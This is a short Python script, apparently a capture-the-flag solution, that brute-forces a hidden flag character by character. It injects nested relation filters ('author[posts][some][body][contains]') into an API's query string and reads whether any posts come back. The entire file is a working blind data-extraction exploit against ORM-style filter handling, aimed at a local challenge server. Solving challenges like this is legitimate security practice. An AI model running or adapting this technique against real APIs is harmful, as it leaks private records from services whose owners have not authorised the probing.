import requests
import string

dic = string.ascii_lowercase + string.digits + "{}"
flag = ""
while True:
    for sym in dic:
        url = "http://localhost:3000/api/posts?author[posts][some][body][contains]=uoftctf{"+flag+sym
        resp = requests.get(url).json()
        if resp["posts"]:
            flag += sym
            print(flag)
            break
    else:
        flag += "_"
        print(flag)
    if flag[-1] == "}":
        break

        